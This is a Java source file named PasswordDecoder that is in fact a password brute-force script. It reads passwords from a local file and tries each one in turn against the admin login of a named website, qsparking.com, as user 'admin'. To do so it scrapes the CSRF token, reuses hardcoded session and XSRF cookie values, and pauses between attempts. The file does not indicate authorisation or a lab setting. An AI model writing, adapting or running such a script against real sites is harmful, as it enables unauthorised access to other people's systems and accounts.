package com.andrew.java.tools;

import cn.hutool.core.io.FileUtil;
import cn.hutool.core.thread.ThreadUtil;
import cn.hutool.core.util.ReUtil;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;

import java.io.File;
import java.net.HttpCookie;
import java.nio.charset.Charset;
import java.util.List;
import java.util.stream.Collectors;

/**
 * 解码
 *
 * @author tongwenjin
 * @since 2025-5-8
 */
public class PasswordDecoder {

    public static void main(String[] args) {

        String cookie = "XSRF-TOKEN=eyJpdiI6IlFsbm50azgzOXJTWG13WTlUc3BhS1E9PSIsInZhbHVlIjoiMzljdmFEcFwvMk9UVFBscjFkcGNMZnZqYmN0a3J1dXVKaTJadlhDTERITXVpWGNDeTVQS1BJMzZscFpVaGhjUVRGejhGMTAyRnFcL2M5aGtcL2NlQ0ZpQVBLMTZ4RkV6R0FuTUxNTDVWTVZPUEJRWVJFTmxkbXhYRUllRFJvSTZNYk4iLCJtYWMiOiIwOTk3ZTBlMDYxNWJmZWVlZTI2YWY2MWViNWVmZWQ4YTFiM2Y4OTQ2ZDlkYjRhMDEyYmFhNjJmNDkzN2VjNjkyIn0%3D; qsparking_session=eyJpdiI6Impzb2dpK1UwM2hcL1FEU1o2N0MxT1N3PT0iLCJ2YWx1ZSI6IlRQMXA2eHRIbWVIVDNleHlGV0RjaWdZSXZjdFc0Wk5YMlE0dm9SSmQ4QlYwTVRDVU1DbFVSTVBzU3BtYmxOTGdrR1ZqU3lFbVI5b1B3RmVsSWlvN1JHa2FQZkFncHhucW90VENybHBhbldqRlo0SEUxbWZSWTBHb2RIWGxWdGFIIiwibWFjIjoiNjRjMzQ0ZDBkZjIxZWI4Nzc3N2VhM2IzZWJjYTY1MDU4Mjk0YjRiY2VjZGU2YTg2MzlmYjE1OThiZWRjZmM0MCJ9; XSRF-TOKEN=eyJpdiI6IlFTd1FNZ05lTklDQ1FQaFpENEdWNGc9PSIsInZhbHVlIjoiZEdFRFpIS0RhY2NDTUNEMXN5WFFcLzZNSmtOYXRzUkNUaWJ6bFV6eXRIcHFzQVhHME5LdDArU2tuY0Z4TTRmMjBpMDZPUnB4clJtQnY3dFJYbWZjUktcL2J2c2RySG1LOE0yUkc4TGNFUndUQXczcUNhcW5PSngxaG1HblhCMStzViIsIm1hYyI6ImM2MmY0MDU3ZGM0MWQ4NTRjMjc5OTY5ZWMxZDMyNGU5YjI5YzIwMDkwZjM0NjIyNGM4N2RjNDgyZDhiOWIxNWQifQ%3D%3D; qsparking_session=eyJpdiI6Imdja0w0bGwwVEFtUjRmNjZBdVB4VFE9PSIsInZhbHVlIjoiSkRFajdHV1ZBdFY1anlPQ0R0akVFeVl2M2VYWlYrQ1JmR09PU3VRWXpmRGo0VDFmOWNwVDk5ZXdFYkxnRTlyaTk5RDB0eVdqdHpjcFFBNDcyVXRXb2lkclpjVm94NzJwbWc1MzlZRFlJR0NVcFZsY3pRU3JzREM2bmp0Q2d2MTciLCJtYWMiOiI2MzZmMzRiZWE1M2MxM2E0MGJlODcyMDMwZDMyMDg5YzE0MTRiNDFjODA0MGQxMjA4NDg2ODkzMWEwYWEzYTMwIn0%3D; SERVERID=b7ce7d389ab85bc4a40af14aef293be4|1746684147|1746683895";

        List<String> pss = FileUtil.readLines(new File("C:\\Users\\Administrator\\Desktop\\ps.txt"), Charset.defaultCharset());
        for (String ps : pss) {
            // 第一步：访问 login 页获取 token 和 cookie
            HttpResponse loginResp = HttpUtil.createGet("https://qsparking.com/admin/auth/login").execute();
            String html = loginResp.body();
            String token = ReUtil.get("name=\"_token\" value=\"(.*?)\"", html, 1);
            String loginPageCookie = loginResp.getCookies().stream()
                    .map(ck -> ck.getName() + "=" + ck.getValue())
                    .collect(Collectors.joining("; "));

            // 第二步：构造登录请求
            String fullCookie = loginPageCookie + "; " + cookie;

            HttpRequest loginReq = HttpUtil.createPost("https://qsparking.com/admin/auth/login")
                    .header("Cookie", fullCookie)
                    .form("_token", token)
                    .form("username", "admin")
                    .form("password", ps);

            HttpResponse resp = loginReq.execute();

            // 第三步：更新 sessionCookie
            String newCookie = resp.getCookies().stream()
                    .map(ck -> ck.getName() + "=" + ck.getValue())
                    .collect(Collectors.joining("; "));

            cookie = newCookie;

            System.out.println(resp.body());
            ThreadUtil.sleep(1000);
        }

    }
}
